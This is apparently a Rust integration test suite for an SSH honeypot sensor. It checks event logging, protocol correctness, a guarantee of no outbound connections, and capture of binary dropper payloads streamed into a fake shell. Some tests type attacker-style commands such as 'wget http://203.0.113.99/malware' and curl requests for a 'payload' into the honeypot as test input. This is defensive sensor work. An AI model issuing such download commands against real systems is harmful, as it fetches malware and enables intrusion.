//! Real-client integration tests (Task 14): connects a russh SSH client to this crate's own
//! SSH honeypot and verifies events, protocol correctness, and the no-outbound-connection
//! guarantee end to end. These tests exercise the full stack: TCP, version exchange, key
//! exchange, encrypted transport, user authentication, channel management, and shell/transfer
//! data flow.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use sensor_framework::{ConnectionBounds, WanResolver};

/// Bounds for a test server: production's shape, with a `max_duration` long enough that no test
/// here can be cut off by it. Deliberately not tiny - a too-short duration would make these tests
/// fail intermittently under load for a reason unrelated to what they assert.
fn test_bounds() -> ConnectionBounds {
    ConnectionBounds {
        read_timeout: Duration::from_secs(30),
        idle_timeout: Duration::from_secs(60),
        max_duration: Duration::from_secs(120),
        max_captured_bytes: 1_000_000,
        max_concurrent: 64,
    }
}

/// Minimal russh client handler that accepts any host key (this is a test against our own
/// honeypot, not a connection to a third party).
struct TestHandler;

impl russh::client::Handler for TestHandler {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        _key: &russh::keys::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

#[tokio::test]
async fn ssh_handshake_and_session_with_real_client() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir,
        host_key_path,
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // Connect with russh client.
    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();

    // Authenticate.
    let auth_result = session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();
    assert!(
        auth_result.success(),
        "authentication must succeed (accept-all)"
    );

    // Open a channel and request a shell.
    let channel = session.channel_open_session().await.unwrap();
    channel
        .request_pty(false, "xterm", 80, 24, 0, 0, &[])
        .await
        .unwrap();
    channel.request_shell(false).await.unwrap();

    // Give the server time to send the initial prompt.
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Type commands.
    channel.data(&b"uname -a\n"[..]).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel
        .data(&b"wget http://203.0.113.99/malware\n"[..])
        .await
        .unwrap();

    // Give the server time to process and emit events.
    tokio::time::sleep(Duration::from_millis(500)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    // Read and verify events.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();

    let signal_types: Vec<&str> = events.iter().map(|e| e.signal_type.as_str()).collect();
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_CONNECTION),
        "missing honeypot_connection event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT),
        "missing honeypot_login_attempt event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC),
        "missing honeypot_command_exec event; got: {signal_types:?}"
    );

    // Verify protocol_label = "ssh" on all events.
    for event in &events {
        let label = event
            .metadata
            .get("protocol_label")
            .and_then(|v| v.as_str());
        assert_eq!(label, Some("ssh"), "protocol_label must be 'ssh'");
    }

    // Verify protocol = "tcp" on all events.
    for event in &events {
        assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
    }

    // Verify authenticated semantics.
    let conn_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_CONNECTION)
        .unwrap();
    assert!(!conn_event.authenticated);
    let login_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT)
        .unwrap();
    assert!(login_event.authenticated);

    // PII discipline: password must not appear in any event.
    let all_json = serde_json::to_string(&events).unwrap();
    assert!(
        !all_json.contains("password123"),
        "password must never appear in events"
    );
}

/// Read one shell reply: bytes until one ends in a prompt, or the connection ends.
async fn read_reply(channel: &mut russh::Channel<russh::client::Msg>) -> (usize, bool) {
    let mut total = 0;
    let mut tail: Vec<u8> = Vec::new();
    loop {
        let message = tokio::time::timeout(Duration::from_secs(10), channel.wait())
            .await
            .expect("timed out waiting for the reply");
        match message {
            Some(russh::ChannelMsg::Data { data }) => {
                total += data.len();
                tail.extend_from_slice(&data);
                tail.drain(..tail.len().saturating_sub(2));
                if tail == b"# " {
                    return (total, false);
                }
            }
            Some(russh::ChannelMsg::Eof | russh::ChannelMsg::Close) | None => {
                return (total, true);
            }
            Some(_) => {}
        }
    }
}

#[tokio::test]
async fn a_connection_that_has_spent_its_egress_allowance_is_dropped_after_that_reply() {
    let dir = tempfile::tempdir().unwrap();
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    assert!(
        session
            .authenticate_password("root", "password")
            .await
            .unwrap()
            .success()
    );
    let mut channel = session.channel_open_session().await.unwrap();
    channel
        .request_pty(false, "xterm", 80, 24, 0, 0, &[])
        .await
        .unwrap();
    channel.request_shell(false).await.unwrap();
    let (_, closed) = read_reply(&mut channel).await;
    assert!(!closed, "the shell opens with a prompt");

    // A 24 KB file, so a short `cat` answers with a packet that fits the client's limit and the
    // client sends little enough to stay inside the window this server never adjusts. Each reply
    // is about 24 KB on the wire (echoed keystrokes, output with CR-LF, prompt), so the 16 MiB
    // allowance runs out near the 699th. The reply that spends it arrives whole, prompt included,
    // and nothing follows it.
    let mut wire = 0;
    for _ in 0..3 {
        let append = format!("echo {} >> /tmp/f\n", "a".repeat(8000));
        channel.data(append.as_bytes()).await.unwrap();
        let (bytes, closed) = read_reply(&mut channel).await;
        assert!(!closed);
        wire += bytes;
    }
    let mut answered = 0;
    loop {
        assert!(answered < 900, "the connection was never dropped");
        if channel.data(&b"cat /tmp/f\n"[..]).await.is_err() {
            break;
        }
        let (bytes, closed) = read_reply(&mut channel).await;
        wire += bytes;
        if closed {
            break;
        }
        answered += 1;
    }
    assert!(
        (650..=750).contains(&answered),
        "answered {answered} lines before the drop"
    );
    assert!(
        wire >= 16 << 20,
        "dropped before the allowance was spent: {wire}"
    );

    drop(channel);
    drop(session);
    handle.abort();
}

#[tokio::test]
async fn exec_request_uses_noninteractive_bash_identity() {
    let dir = tempfile::tempdir().unwrap();
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    assert!(
        session
            .authenticate_password("root", "password")
            .await
            .unwrap()
            .success()
    );

    let mut channel = session.channel_open_session().await.unwrap();
    channel.exec(false, b"nosuchcmd_q").await.unwrap();
    let (stdout, stderr, status, eof, close) =
        tokio::time::timeout(Duration::from_secs(3), async {
            let mut stdout = Vec::new();
            let mut stderr = Vec::new();
            let mut status = None;
            let mut eof = false;
            let mut close = false;
            while let Some(message) = channel.wait().await {
                match message {
                    russh::ChannelMsg::Data { data } => stdout.extend_from_slice(&data),
                    russh::ChannelMsg::ExtendedData { data, ext } => {
                        assert_eq!(ext, 1, "stderr must use SSH extended-data type 1");
                        stderr.extend_from_slice(&data);
                    }
                    russh::ChannelMsg::ExitStatus { exit_status } => status = Some(exit_status),
                    russh::ChannelMsg::Eof => eof = true,
                    russh::ChannelMsg::Close => {
                        close = true;
                        break;
                    }
                    _ => {}
                }
            }
            (stdout, stderr, status, eof, close)
        })
        .await
        .expect("timed out waiting for SSH exec output");
    assert!(stdout.is_empty(), "non-PTY stderr leaked into stdout");
    assert_eq!(stderr, b"bash: line 1: nosuchcmd_q: command not found\n");
    assert_eq!(status, Some(127));
    assert!(eof, "exec did not send channel EOF");
    assert!(close, "exec did not close its channel");

    drop(channel);
    drop(session);
    handle.abort();
}

#[tokio::test]
async fn exec_larger_than_the_initial_window_drains_through_window_adjustments() {
    let dir = tempfile::tempdir().unwrap();
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    assert!(
        session
            .authenticate_password("root", "password")
            .await
            .unwrap()
            .success()
    );

    let mut channel = session.channel_open_session().await.unwrap();
    channel
        .exec(
            false,
            b"/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
        )
        .await
        .unwrap();
    let (stdout, stderr, status, eof, close) =
        tokio::time::timeout(Duration::from_secs(10), async {
            let mut stdout = Vec::new();
            let mut stderr = Vec::new();
            let mut status = None;
            let mut eof = false;
            let mut close = false;
            while let Some(message) = channel.wait().await {
                match message {
                    russh::ChannelMsg::Data { data } => stdout.extend_from_slice(&data),
                    russh::ChannelMsg::ExtendedData { data, ext } => {
                        assert_eq!(ext, 1);
                        stderr.extend_from_slice(&data);
                    }
                    russh::ChannelMsg::ExitStatus { exit_status } => status = Some(exit_status),
                    russh::ChannelMsg::Eof => eof = true,
                    russh::ChannelMsg::Close => {
                        close = true;
                        break;
                    }
                    _ => {}
                }
            }
            (stdout, stderr, status, eof, close)
        })
        .await
        .expect("large exec stalled at the SSH channel window");

    assert_eq!(stdout.len(), 2_193_272);
    assert_eq!(&stdout[..4], b"\x7fELF");
    assert!(stderr.is_empty());
    assert_eq!(status, Some(0));
    assert!(eof);
    assert!(close);

    drop(channel);
    drop(session);
    handle.abort();
}

#[tokio::test]
async fn one_connection_routes_independent_channels_and_caps_the_table() {
    let dir = tempfile::tempdir().unwrap();
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    assert!(
        session
            .authenticate_password("root", "password")
            .await
            .unwrap()
            .success()
    );

    let mut channels = Vec::new();
    for _ in 0..10 {
        channels.push(session.channel_open_session().await.unwrap());
    }
    assert!(
        session.channel_open_session().await.is_err(),
        "an eleventh live channel must be refused"
    );

    channels[0].exec(false, b"whoami").await.unwrap();
    channels[1].exec(false, b"pwd").await.unwrap();
    let mut outputs = Vec::new();
    for channel in channels.iter_mut().take(2) {
        let mut output = Vec::new();
        while let Some(message) = channel.wait().await {
            match message {
                russh::ChannelMsg::Data { data } => output.extend_from_slice(&data),
                russh::ChannelMsg::Close => break,
                _ => {}
            }
        }
        outputs.push(output);
    }
    assert_eq!(outputs[0], b"root\n");
    assert_eq!(outputs[1], b"/root\n");

    drop(channels);
    drop(session);
    handle.abort();
}

#[tokio::test]
async fn no_outbound_connections() {
    // Start a "target" server that the fake wget/curl would connect to if it actually made
    // network requests. Verify it receives zero connections.
    let target_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let target_addr = target_listener.local_addr().unwrap();
    let connection_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let count = connection_count.clone();
    let target_task = tokio::spawn(async move {
        loop {
            if let Ok((_stream, _addr)) = target_listener.accept().await {
                count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            }
        }
    });

    let dir = tempfile::tempdir().unwrap();
    let spool_dir = dir.path().join("spool");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        spool_dir,
        dir.path().join("host_key"),
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session.authenticate_password("root", "pass").await.unwrap();
    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    let cmd = format!("wget http://127.0.0.1:{}/malware.bin\n", target_addr.port());
    channel.data(cmd.as_bytes()).await.unwrap();
    let cmd = format!("curl http://127.0.0.1:{}/payload\n", target_addr.port());
    channel.data(cmd.as_bytes()).await.unwrap();

    tokio::time::sleep(Duration::from_secs(1)).await;
    drop(channel);
    drop(session);
    handle.abort();
    target_task.abort();

    assert_eq!(
        connection_count.load(std::sync::atomic::Ordering::Relaxed),
        0,
        "sensor must open ZERO outbound connections"
    );
}

// ---------------------------------------------------------------------
// Shell-channel evidence capture
//
// SCP/SFTP uploads were already captured through `CaptureHandoff`; the interactive shell
// channel was not, so a Mirai/Gafgyt loader that streams its binary dropper straight into the
// fake shell (rather than using scp/sftp) had that payload suppressed to FakeShell's one-line
// "flood: binary" marker and discarded - never recoverable. These two tests are the mirror of
// sensor-telnet's `capture_is_a_noop_until_start_capture_is_called` family, but end to end
// against a real SSH client/server pair: one proves a binary shell payload is spooled and
// produces a honeypot_malware_upload event, the other proves an ordinary plaintext session
// produces no such capture.
// ---------------------------------------------------------------------

/// Poll `log_path` up to ~1s for an event whose `signal_type` is `honeypot_malware_upload`,
/// returning it if one appears. Bounded polling rather than a fixed sleep: the handoff worker
/// drains its queue off the response path (see `sensor_framework::handoff`'s module doc), so the
/// event can lag the session's close by a small, variable amount.
async fn poll_for_malware_upload(log_path: &std::path::Path) -> Option<sensor_wire::SensorEvent> {
    poll_for_malware_upload_within(log_path, Duration::from_secs(1)).await
}

/// Same, with an explicit deadline: a test that waits for the listener's `max_duration` to cancel
/// a session needs longer than the close-driven case.
async fn poll_for_malware_upload_within(
    log_path: &std::path::Path,
    deadline: Duration,
) -> Option<sensor_wire::SensorEvent> {
    for _ in 0..(deadline.as_millis() / 50).max(1) {
        if let Ok(content) = tokio::fs::read_to_string(log_path).await {
            for line in content.lines() {
                if let Ok(event) = serde_json::from_str::<sensor_wire::SensorEvent>(line)
                    && event.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD
                {
                    return Some(event);
                }
            }
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    None
}

/// The same dropper, cut off mid-line by the listener's `max_duration` instead of finishing.
/// Nothing here raises the per-line flood flag - no line is ever completed - and the session is
/// ended by the listener rather than the client, so this exercises the two production conditions
/// the unit test cannot: detection from the raw bytes, and a capture that must report itself
/// incomplete.
#[tokio::test]
async fn a_payload_cut_off_mid_line_is_still_captured_and_marked_incomplete() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let bounds = ConnectionBounds {
        max_duration: Duration::from_secs(3),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        host_key_path,
        wan_resolver,
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();
    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Mostly non-printable, and deliberately unterminated: every byte is high-bit set, so none is
    // CR or LF and the line buffer never reaches MAX_LINE_LEN either. The shell therefore never
    // sees a line, and nothing raises the per-line flood flag.
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    channel.data(&payload[..]).await.unwrap();

    // Hold the session open and let max_duration cancel the handler.
    let event = poll_for_malware_upload_within(&log_path, Duration::from_secs(8))
        .await
        .expect("a cancelled session's binary capture must still be recorded");
    drop(channel);
    drop(session);
    handle.abort();

    assert_eq!(
        event.metadata["capture_reason"], "binary_shell_payload",
        "{:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["complete"], false,
        "a capture handed over by a cancelled handler is a fragment: {:?}",
        event.metadata
    );
    // `Cancelled` is the one ending no code in the handler can record - the listener drops the
    // whole future - so it survives only as the initial value. Asserting `complete` alone would
    // pass for any of the other cut-short reasons too.
    assert_eq!(
        event.metadata["end_reason"], "session_cancelled",
        "{:?}",
        event.metadata
    );
    assert_eq!(event.metadata["size"], payload.len() as u64);
    assert_eq!(event.metadata["wire_size"], payload.len() as u64);
    assert_eq!(event.metadata["truncated"], false);

    let spooled = spooled_files(&spool_dir);
    assert_eq!(spooled.len(), 1, "the cut-off payload must be spooled");
    let stored = std::fs::read(&spooled[0]).unwrap();
    assert_eq!(stored, payload, "the stored bytes are what the client sent");
}

/// The captures stored in `dir`: files named by the SHA-256 of their content. The spool also holds a
/// `.staging/` directory, where a body is written before it is published under that name.
fn spooled_files(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    std::fs::read_dir(dir)
        .map(|entries| {
            entries
                .flatten()
                .filter(|e| {
                    sensor_framework::spool::is_canonical_sha256_hex(
                        &e.file_name().to_string_lossy(),
                    )
                })
                .map(|e| e.path())
                .collect()
        })
        .unwrap_or_default()
}

/// How the client ends the session. The sensor has no protocol-defined end of file for a shell
/// capture, so this is the only thing that can say whether the bytes are the whole payload.
#[derive(Clone, Copy)]
enum Ending {
    /// Stop sending and let `idle_timeout` elapse with the session still open.
    GoQuiet,
    /// Send SSH_MSG_DISCONNECT. The peer finished and said so.
    Disconnect,
    /// Drop the TCP connection cleanly, with no DISCONNECT first. The server's next packet read
    /// reports end-of-file, which `classify_read_failure` must read as the peer finishing - the
    /// second ending that has to stay `complete`, and one no production-path test covered.
    CloseSocket,
    /// Abort the TCP connection with an RST (`SO_LINGER` 0). The server's next read fails with a
    /// reset instead of end-of-file, which is a cut-short transfer, not a finished one. These two
    /// endings differ by one socket option and by nothing the handler can otherwise see.
    ResetConnection,
}

/// Drive one unterminated binary payload to `ending` and return the upload event. Every caller
/// sends the same kind of payload, so a difference in the recorded outcome can only come from how
/// the session ended.
async fn payload_session(
    idle_timeout: Duration,
    payload: &[u8],
    ending: Ending,
) -> sensor_wire::SensorEvent {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let bounds = ConnectionBounds {
        idle_timeout,
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        wan_resolver,
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // Dropping a russh Handle asks its background task to shut the socket down cleanly before the
    // final close, which defeats SO_LINGER=0 and turns an intended reset into EOF. For the reset
    // case, put a byte-transparent proxy in front of the server and reset the proxy's upstream
    // socket on an explicit signal. The clean-close case still connects directly.
    let mut reset_trigger = None;
    let client_addr = if matches!(ending, Ending::ResetConnection) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let proxy_addr = listener.local_addr().unwrap();
        let (tx, rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            let (mut downstream, _) = listener.accept().await.unwrap();
            let mut upstream = tokio::net::TcpStream::connect(addr).await.unwrap();
            #[allow(deprecated)]
            upstream.set_linger(Some(Duration::ZERO)).unwrap();
            tokio::select! {
                _ = tokio::io::copy_bidirectional(&mut downstream, &mut upstream) => {}
                _ = rx => {}
            }
        });
        reset_trigger = Some(tx);
        proxy_addr
    } else {
        addr
    };
    let socket = tokio::net::TcpStream::connect(client_addr).await.unwrap();
    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect_stream(config, socket, TestHandler)
        .await
        .unwrap();
    session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();
    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel.data(payload).await.unwrap();

    if matches!(ending, Ending::ResetConnection) {
        // `Channel::data` queues into russh's writer task. Give the proxy time to forward the
        // encrypted packet before resetting its upstream side.
        tokio::time::sleep(Duration::from_millis(100)).await;
        let _ = reset_trigger.take().unwrap().send(());
    }

    match ending {
        Ending::Disconnect => {
            session
                .disconnect(russh::Disconnect::ByApplication, "", "")
                .await
                .unwrap();
        }
        Ending::CloseSocket | Ending::ResetConnection => {
            // Tear the connection down before waiting for the capture: the ending IS the trigger
            // here, so polling first would just wait out the idle timeout and record that reason
            // instead of the one under test.
            drop(channel);
            drop(session);
        }
        Ending::GoQuiet => {}
    }
    let event = poll_for_malware_upload_within(&log_path, Duration::from_secs(8))
        .await
        .expect("the binary capture must be recorded whatever ended the session");
    handle.abort();
    event
}

/// An SSH session that goes quiet mid-payload is not a finished one: the read fails with a
/// timeout, which used to reach the same "the loop returned" line as a clean disconnect and be
/// labelled complete.
#[tokio::test]
async fn a_payload_abandoned_mid_transfer_is_recorded_as_cut_short_by_the_idle_timeout() {
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    let event = payload_session(Duration::from_millis(600), &payload, Ending::GoQuiet).await;

    assert_eq!(
        event.metadata["end_reason"], "idle_timeout",
        "{:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["complete"], false,
        "an idle timeout cut the transfer short: {:?}",
        event.metadata
    );
}

/// The other side of the distinction: the client said it was done. This is the ending that must
/// still read as complete, so the fix above cannot be "label everything incomplete".
#[tokio::test]
async fn a_payload_the_client_finished_sending_before_disconnecting_is_recorded_as_complete() {
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    let event = payload_session(Duration::from_secs(60), &payload, Ending::Disconnect).await;

    assert_eq!(
        event.metadata["end_reason"], "client_logout",
        "{:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["complete"], true,
        "the client disconnected of its own accord: {:?}",
        event.metadata
    );
}

/// A client that just closes the socket never sends DISCONNECT, so the ending is decided inside
/// `classify_read_failure` rather than by a message the handler can match on. End-of-file means
/// the peer stopped of its own accord, so this has to stay complete - and it is the case an RST is
/// easiest to confuse with, since both simply end the packet loop.
#[tokio::test]
async fn a_payload_whose_client_closes_the_socket_is_recorded_as_peer_closed() {
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    let event = payload_session(Duration::from_secs(60), &payload, Ending::CloseSocket).await;

    assert_eq!(
        event.metadata["end_reason"], "peer_closed",
        "{:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["complete"], true,
        "the peer closed the connection itself: {:?}",
        event.metadata
    );
}

/// The same teardown one socket option apart: an RST makes the server's read fail rather than
/// report end-of-file, so the transfer was still open. Until this test, no SSH test drove a real
/// read FAILURE through the production path at all - `classify_read_failure` was covered only by
/// unit tests calling it directly, which cannot show it is reached.
#[tokio::test]
async fn a_payload_ended_by_a_connection_reset_is_recorded_as_a_transport_failure() {
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    let event = payload_session(Duration::from_secs(60), &payload, Ending::ResetConnection).await;

    assert_eq!(
        event.metadata["complete"], false,
        "a reset connection left the transfer open: {:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["end_reason"], "transport_error",
        "an RST is a socket failure, not the peer finishing: {:?}",
        event.metadata
    );
}

#[tokio::test]
async fn binary_shell_payload_is_captured_as_malware_upload() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        host_key_path,
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();

    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    // A line of mostly non-printable bytes (well over the 30% threshold `is_binary_line` uses),
    // terminated by Enter so it commits as one line and reaches `shell.handle_input`. Stands in
    // for a loader streaming a binary dropper straight into the "shell" instead of using scp/sftp.
    let mut payload: Vec<u8> = Vec::new();
    for i in 0u8..200 {
        payload.push(0x80u8.wrapping_add(i));
    }
    payload.push(b'\n');
    channel.data(&payload[..]).await.unwrap();

    tokio::time::sleep(Duration::from_millis(300)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);

    let event = poll_for_malware_upload(&log_path)
        .await
        .expect("a honeypot_malware_upload event must be emitted for a binary shell payload");
    handle.abort();

    assert!(event.authenticated);
    assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
    let sample = event
        .sample
        .expect("the malware_upload event must carry a sample");
    assert!(!sample.sha256.is_empty(), "sample.sha256 must be non-empty");
    assert!(sample.size > 0, "sample.size must be non-empty");
    assert_eq!(
        event
            .metadata
            .get("capture_reason")
            .and_then(|v| v.as_str()),
        Some("binary_shell_payload")
    );

    // The sample must actually have landed in the spool directory, not just be named in the
    // event - the spool is the recoverable-evidence artifact this fix exists to produce.
    let spooled = spooled_files(&spool_dir);
    assert!(
        !spooled.is_empty(),
        "the binary payload must be written to the quarantine spool directory"
    );

    // PII discipline, mirroring the plaintext test above: the password must never appear
    // anywhere in the emitted events, including this new capture path.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    assert!(
        !content.contains("password123"),
        "password must never appear in events, including malware_upload capture"
    );
}

#[tokio::test]
async fn plaintext_shell_session_produces_no_malware_upload_capture() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir,
        host_key_path,
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();

    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    channel.data(&b"uname -a\n"[..]).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel.data(&b"whoami\n"[..]).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);

    // No malware_upload event must ever appear for an all-plaintext interactive session - a
    // fixed wait (not the poll helper, which is built to return early on a hit) so the negative
    // assertion actually gives the handoff worker its full window to prove nothing arrives.
    tokio::time::sleep(Duration::from_millis(500)).await;
    handle.abort();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    assert!(
        !events
            .iter()
            .any(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD),
        "a plaintext-only shell session must never produce a malware_upload capture"
    );
}

// ---------------------------------------------------------------------
// Connection bounds
//
// This sensor hand-rolled its own accept loop and so had none of the framework bounds every
// other sensor gets: no concurrency cap, no session-duration cap, and a bare `continue` on
// accept errors. Nothing in the session path imposes a deadline either - every phase awaits a
// socket read with no timeout - so a peer that connected and then went quiet held its connection,
// and its descriptor, forever. Verified against the live sensor before the fix: a connection left
// idle after KEXINIT was still open 75 seconds later.
//
// Both tests below fail against that old loop, which is the point of them.
// ---------------------------------------------------------------------

